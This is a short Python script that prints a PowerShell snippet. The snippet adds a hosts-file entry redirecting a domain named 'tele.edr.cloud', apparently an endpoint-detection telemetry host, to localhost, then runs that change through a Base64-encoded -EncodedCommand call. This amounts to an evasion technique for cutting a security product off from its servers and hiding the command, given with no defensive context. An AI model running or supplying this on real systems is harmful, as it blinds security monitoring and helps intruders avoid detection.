x = """
$cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc
"""
print(x)